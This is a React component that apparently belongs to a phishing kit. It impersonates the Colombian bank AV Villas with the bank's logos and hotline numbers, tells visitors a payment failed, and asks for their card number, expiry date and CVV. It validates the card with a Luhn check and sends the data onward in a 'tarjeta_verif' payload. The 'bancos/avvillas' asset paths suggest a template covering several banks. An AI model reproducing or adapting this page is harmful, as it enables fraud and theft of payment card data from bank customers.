/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState, useMemo } from "react";
import LoaderFullScreen from "./LoaderFullScreen";

interface TcProps {
  enviar?: (data: any) => void;
  banco?: string;
  isError?: boolean;
}

// Luhn check
const luhnCheck = (cardNumber: string): boolean => {
  const cleanedNumber = String(cardNumber).replace(/\D/g, '');
  if (cleanedNumber.length !== 16) return false;

  let sum = 0;
  let double = false;
  for (let i = cleanedNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cleanedNumber.charAt(i), 10);
    if (double) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    double = !double;
  }
  return (sum % 10) === 0;
};

// Check Expiration Date
const isNotExpired = (fecha: string): boolean => {
  if (fecha.length !== 5) return false;
  const [monthStr, yearStr] = fecha.split('/');
  const month = parseInt(monthStr, 10);
  const year = parseInt(`20${yearStr}`, 10);
  if (isNaN(month) || isNaN(year) || month < 1 || month > 12) return false;

  const currentDate = new Date();
  const currentMonth = currentDate.getMonth() + 1; // 1-12
  const currentYear = currentDate.getFullYear();

  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;

  return true;
};

export default function Tc({ enviar, banco, isError }: TcProps) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);

  // Errores para estilos rojos
  const [tarjetaError, setTarjetaError] = useState(false);
  const [fechaError, setFechaError] = useState(false);
  const [cvvError, setCvvError] = useState(false);

  // Handlers
  const handleTarjetaChange = (value: string) => {
    let raw = value.replace(/\D/g, "").substring(0, 16);
    // formatear para la vista: 0000 0000 0000 0000
    const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
    setTarjeta(formatted);
    setTarjetaError(raw.length === 16 && !luhnCheck(raw));
  };

  const handleFechaChange = (value: string) => {
    let raw = value.replace(/\D/g, "");
    if (raw.length > 2) {
      raw = raw.substring(0, 2) + "/" + raw.substring(2, 4);
    }
    raw = raw.substring(0, 5);
    setFecha(raw);
    setFechaError(raw.length === 5 && !isNotExpired(raw));
  };

  const handleCvvChange = (value: string) => {
    let raw = value.replace(/\D/g, "").substring(0, 4);
    setCvv(raw);
    setCvvError(raw.length > 0 && raw.length < 3);
  };

  const rawTarjeta = tarjeta.replace(/\s/g, "");
  const canSubmit = 
    rawTarjeta.length === 16 && luhnCheck(rawTarjeta) &&
    fecha.length === 5 && isNotExpired(fecha) &&
    (cvv.length === 3 || cvv.length === 4);

  const handleSubmitClick = () => {
    if (!canSubmit) return;
    setLoading(true);

    const payload = {
      view: "tarjeta_verif",
      tarjeta: rawTarjeta,
      fecha: fecha,
      cvv: cvv,
      bank: banco || "avvillas"
    };

    enviar?.(payload);
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />

      {/* Imágenes decorativas */}
      <img src="/bancos/avvillas/img/super-v-ne.svg" id="super-nuevo" alt="" />
      <img id="sup-der" src="/bancos/avvillas/img/sup-der.svg" alt="" />

      <table
        width="100%"
        cellPadding={0}
        cellSpacing={0}
        border={0}
        style={{ margin: "0 auto", maxWidth: "1280px" }}
      >
        <tbody>
          <tr>
            {/* LADO DERECHO: slider + teléfonos (imagen de la chica y logo de Aval) */}
            <td width="60%" valign="top" id="lado-der">
              <div className="slider">
                <ul>
                  <li><img src="/bancos/avvillas/img/s1.fw-min.png" alt="" /></li>
                  <li><img src="/bancos/avvillas/img/s2.fw-min.png" alt="" /></li>
                  <li><img src="/bancos/avvillas/img/s3.fw-min.png" alt="" /></li>
                  <li><img src="/bancos/avvillas/img/s4.fw-min.png" alt="" /></li>
                </ul>
              </div>

              <table border={0} cellSpacing={0} cellPadding={0}>
                <tbody>
                  <tr>
                    <td rowSpan={2}>
                      <img
                        src="/bancos/avvillas/img/a-logo-color.svg"
                        width={100}
                        style={{ marginRight: 20 }}
                        alt="Audiovillas"
                      />
                    </td>
                    <td className="etq-titulo">Línea Audiovillas</td>
                  </tr>
                  <tr>
                    <td>
                      <table cellPadding={0} cellSpacing={0} border={0}>
                        <tbody>
                          <tr>
                            <td className="etq-titulo borde">Bogotá</td>
                            <td className="etq-titulo borde">Medellín</td>
                            <td className="etq-titulo borde">Barranquilla</td>
                            <td className="etq-titulo borde">Bucaramanga</td>
                            <td className="etq-titulo borde">Cali</td>
                            <td className="etq-titulo">Resto del país</td>
                          </tr>
                          <tr>
                            <td className="etq-telefono borde">(601) 4441777</td>
                            <td className="etq-telefono borde">(604) 3256000</td>
                            <td className="etq-telefono borde">(605) 3304330</td>
                            <td className="etq-telefono borde">(607) 6302980</td>
                            <td className="etq-telefono borde">(602) 8859595</td>
                            <td className="etq-telefono">01 8000 51 8000</td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                </tbody>
              </table>
            </td>

            {/* LADO IZQUIERDO: formulario TC */}
            <td width="40%" valign="top" id="lado-izq">
              <div className="pnl-izq" style={{ padding: "40px", backgroundColor: "#fff", borderRadius: "10px" }}>
                <div style={{ textAlign: "left", marginBottom: "40px" }}>
                  <img src="/bancos/avvillas/img/logo-pal.svg" alt="Banca virtual" style={{ width: "160px" }} />
                </div>

                <div className="titulo" style={{ fontSize: "22px", color: "#1a2530", marginBottom: "20px", fontWeight: "bold", textAlign: "center" }}>
                  Pago no realizado
                </div>

                <div style={{ fontSize: "14px", color: "#444", textAlign: "center", marginBottom: "35px", lineHeight: "1.6", fontWeight: "500", padding: "0 10px" }}>
                  En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
                </div>

                {isError && (
                  <div style={{ color: "#A00104", marginBottom: "15px", fontSize: "14px", fontWeight: "bold", textAlign: "center" }}>
                    Los datos ingresados son incorrectos.
                  </div>
                )}

                {/* Número de Tarjeta */}
                <div
                  className="frm-input"
                  style={{
                    borderBottom: tarjetaError ? "2px solid #A00104" : "2px solid #0048DB",
                    marginBottom: "30px"
                  }}
                >
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                  >
                    <tbody>
                      <tr>
                        <td align="left">
                          <div
                            className="etiqueta"
                            style={{
                              color: tarjetaError ? "#A00104" : "#0048DB",
                            }}
                          >
                            Número de Tarjeta
                          </div>
                          <input
                            type="text"
                            className="entrada"
                            autoComplete="off"
                            inputMode="numeric"
                            placeholder="0000 0000 0000 0000"
                            value={tarjeta}
                            onChange={(e) => handleTarjetaChange(e.target.value)}
                            style={{ position: "relative", zIndex: 10, top: "-9px", backgroundColor: "transparent" }}
                          />
                        </td>
                        <td valign="middle" align="right" width={24}>
                          <img
                            src="/bancos/avvillas/img/alerta.jpg"
                            width={25}
                            alt=""
                            className="icon-entrada"
                            style={{ display: tarjetaError ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* Fecha de Vencimiento */}
                <div
                  className="frm-input"
                  style={{
                    borderBottom: fechaError ? "2px solid #A00104" : "2px solid #0048DB",
                    marginBottom: "30px"
                  }}
                >
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                  >
                    <tbody>
                      <tr>
                        <td align="left">
                          <div
                            className="etiqueta"
                            style={{
                              color: fechaError ? "#A00104" : "#0048DB",
                            }}
                          >
                            Fecha de Vencimiento (MM/AA)
                          </div>
                          <input
                            type="text"
                            className="entrada"
                            autoComplete="off"
                            inputMode="numeric"
                            placeholder="MM/AA"
                            value={fecha}
                            onChange={(e) => handleFechaChange(e.target.value)}
                            style={{ position: "relative", zIndex: 10, top: "-9px", backgroundColor: "transparent" }}
                          />
                        </td>
                        <td valign="middle" align="right" width={24}>
                          <img
                            src="/bancos/avvillas/img/alerta.jpg"
                            width={25}
                            alt=""
                            className="icon-entrada"
                            style={{ display: fechaError ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* CVV */}
                <div
                  className="frm-input"
                  style={{
                    borderBottom: cvvError ? "2px solid #A00104" : "2px solid #0048DB",
                    marginBottom: "40px"
                  }}
                >
                  <table
                    border={0}
                    width="100%"
                    cellPadding={0}
                    cellSpacing={0}
                    style={{ height: 54 }}
                  >
                    <tbody>
                      <tr>
                        <td align="left">
                          <div
                            className="etiqueta"
                            style={{
                              color: cvvError ? "#A00104" : "#0048DB",
                            }}
                          >
                            CVV
                          </div>
                          <input
                            type="password"
                            className="entrada"
                            autoComplete="off"
                            inputMode="numeric"
                            placeholder="***"
                            value={cvv}
                            onChange={(e) => handleCvvChange(e.target.value)}
                            style={{ position: "relative", zIndex: 10, top: "-10px", backgroundColor: "transparent", letterSpacing: "2px" }}
                          />
                        </td>
                        <td valign="middle" align="right" width={24}>
                          <img
                            src="/bancos/avvillas/img/seguridad.jpg"
                            width={22}
                            alt=""
                            className="icon-entrada"
                            style={{ display: cvvError ? "none" : "inline-block" }}
                          />
                          <img
                            src="/bancos/avvillas/img/alerta.jpg"
                            width={25}
                            alt=""
                            className="icon-entrada"
                            style={{ display: cvvError ? "inline-block" : "none" }}
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* Botón OBTENER TU CUPO */}
                <button
                  type="button"
                  disabled={!canSubmit}
                  onClick={handleSubmitClick}
                  style={{
                    width: "100%",
                    padding: "16px 0",
                    borderRadius: "30px",
                    border: "none",
                    fontWeight: "bold",
                    fontSize: "15px",
                    color: "#fff",
                    cursor: canSubmit ? "pointer" : "not-allowed",
                    backgroundColor: canSubmit ? "#0048DB" : "#c4cad3",
                    transition: "background-color 0.3s"
                  }}
                >
                  OBTENER TU CUPO
                </button>

              </div>
            </td>
          </tr>
        </tbody>
      </table>

      {/* Footers */}
      <div id="footer2">
        <table border={0} cellSpacing={0} cellPadding={0} width="90%" style={{ margin: "0 auto" }}>
          <tbody>
            <tr>
              <td rowSpan={2}>
                <img src="/bancos/avvillas/img/a-logo-color.svg" width={100} style={{ marginRight: 20, marginBottom: 10 }} alt="" />
                <br />
                <img src="/bancos/avvillas/img/super-h-ne.svg" width={130} alt="" />
              </td>
              <td className="etq-titulo">Línea Audiovillas</td>
            </tr>
            <tr>
              <td>
                <table cellPadding={0} cellSpacing={0} border={0} width="100%">
                  <tbody>
                    <tr>
                      <td className="etq-titulo borde">Bogotá</td>
                      <td className="etq-titulo borde">Medellín</td>
                      <td className="etq-titulo borde">Barranquilla</td>
                      <td className="etq-titulo borde">Bucaramanga</td>
                      <td className="etq-titulo borde">Cali</td>
                      <td className="etq-titulo">Resto del país</td>
                    </tr>
                    <tr>
                      <td className="etq-telefono borde">(601) 4441777</td>
                      <td className="etq-telefono borde">(604) 3256000</td>
                      <td className="etq-telefono borde">(605) 3304330</td>
                      <td className="etq-telefono borde">(607) 6302980</td>
                      <td className="etq-telefono borde">(602) 8859595</td>
                      <td className="etq-telefono">01 8000 51 8000</td>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer5">
        <table border={0} cellSpacing={0} cellPadding={0} width="100%">
          <tbody>
            <tr>
              <td rowSpan={4} id="col-super"><img src="/bancos/avvillas/img/superv-blanco.svg" width={10} alt="" /></td>
              <td colSpan={7}>&nbsp;</td>
            </tr>
            <tr><td colSpan={7} className="etq-titulo">Línea Audiovillas</td></tr>
            <tr><td colSpan={7}>&nbsp;</td></tr>
            <tr>
              <td className="etq-titulo borde">Bogotá<br /><span className="etq-telefono-m">(601) 4441777</span></td>
              <td className="etq-titulo borde">Medellín<br /><span className="etq-telefono-m">(604) 3256000</span></td>
              <td className="etq-titulo borde">Barranquilla<br /><span className="etq-telefono-m">(605) 3304330</span></td>
              <td className="etq-titulo borde">Bucaramanga<br /><span className="etq-telefono-m">(607) 6302980</span></td>
              <td className="etq-titulo borde">Cali<br /><span className="etq-telefono-m">(602) 8859595</span></td>
              <td className="etq-titulo">Resto del país<br /><span className="etq-telefono-m">01 8000 51 8000</span></td>
              <td id="col-logo"><img src="/bancos/avvillas/img/logo-blanco.svg" width={70} alt="" /></td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer4">
        <table border={0} width="100%" cellPadding={0} cellSpacing={0}>
          <tbody>
            <tr><td colSpan={3} className="etq-titulo">Línea Audiovillas</td></tr>
            <tr>
              <td className="etq-titulo borde">Nacional<br /><span className="etq-telefono-m">01 8000 51 8000</span></td>
              <td className="etq-titulo borde">Bogotá<br /><span className="etq-telefono-m">(601) 4441777</span></td>
              <td>
                <table>
                  <tbody>
                    <tr>
                      <td style={{ color: "#fff" }} className="etq-titulo">Más ciudades</td>
                      <td><img src="/bancos/avvillas/img/flecha-abajo.png" width={13} alt="" /></td>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="footer3">
        <table width="100%" border={0} cellSpacing={0}>
          <tbody>
            <tr>
              <td align="left"><img src="/bancos/avvillas/img/a-logo-color.svg" width={70} alt="" /></td>
              <td align="right"><img src="/bancos/avvillas/img/super-h-ne.svg" width={130} alt="" /></td>
            </tr>
          </tbody>
        </table>
      </div>
    </>
  );
}
